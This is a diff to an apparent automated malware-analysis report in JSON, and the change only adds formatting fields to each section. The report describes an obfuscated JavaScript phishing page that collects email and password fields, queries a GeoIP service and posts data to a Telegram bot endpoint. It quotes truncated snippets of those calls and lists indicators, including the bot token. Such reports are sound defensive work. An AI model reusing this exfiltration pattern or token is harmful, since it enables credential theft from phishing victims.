@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "Sample consists of a long single line of code",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -24,6 +25,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -35,6 +37,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript appends a child object to the document and clicks it\n\t\tHTMLButtonElement[33].click(anonymous)\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -57,6 +60,7 @@
       {
         "auto_collapse": false,
         "body": "A domain associated with GeoIP services was observed\n\t\tDomain 'ip.seeip.org' is for a GeoIP service.\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -79,6 +83,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript sends a network request via jQuery\n\t\t$.getJSON(https://ip.seeip.org/geoip,function(_0x5ce0c5){function _0x7f297f(_0x19b56f,_0x52f5d0,_0x5...\n\t\t$.post(https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage,[objec...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -101,6 +106,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[42].send()\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -123,6 +129,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript builds a webpage that is used for phishing\n\t\tThe following terms were found in the document: Password,email,password",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -145,6 +152,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript attempts to sleep\n\t\twindow[4].setInterval(function _0x42b2a3(_0x216b8d){var _0x544d02={'zmhqO':function(_0x29989c){retur...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -167,6 +175,7 @@
       {
         "auto_collapse": false,
         "body": "Redirection to:\nhttps://ia801500.us.archive.org/34/items/7164025490-20221107-091147/7164025490_20221107_091147.mp3",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -195,6 +204,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"liftca.org\"}, {\"ioc_type\": \"domain\", \"ioc\": \"cdnjs.cloudflare.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ajax/libs/zepto/1.2.0/zepto.min.js\"}, {\"ioc_type\": \"domain\", \"ioc\": \"logo.clearbit.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://logo.clearbit.com/liftca.org\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/liftca.org\"}, {\"ioc_type\": \"domain\", \"ioc\": \"ip.seeip.org\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://ip.seeip.org/geoip\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/geoip\"}, {\"ioc_type\": \"domain\", \"ioc\": \"api.telegram.org\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://api.telegram.org/bot1843792137:aaek1uknbodz64w-oxep8m3behanh1pvfhw/sendmessage\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/bot1843792137:aaek1uknbodz64w-oxep8m3behanh1pvfhw/sendmessage\"}, {\"ioc_type\": \"ip\", \"ioc\": \"127.0.0.1\"}, {\"ioc_type\": \"domain\", \"ioc\": \"ia801500.us.archive.org\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://ia801500.us.archive.org/34/items/7164025490-20221107-091147/7164025490_20221107_091147.mp3\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/34/items/7164025490-20221107-091147/7164025490_20221107_091147.mp3\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -243,6 +258,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"url\": \"https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js\", \"method\": \"get\"}, {\"url\": \"https://ip.seeip.org/geoip\", \"method\": \"get\"}, {\"url\": \"https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage\", \"method\": \"post\"}]",
+        "body_config": {
+          "column_order": [
+            "url",
+            "method"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -283,6 +304,7 @@
       {
         "auto_collapse": false,
         "body": "\t\tObfuscated code was found that was obfuscated by: obfuscator.io",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -301,6 +323,7 @@
       {
         "auto_collapse": false,
         "body": "View extracted file 55b67b30917c6786f9d53a39af6166ca638c797c408c8743e705680ecb807f09.cleaned for details.",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
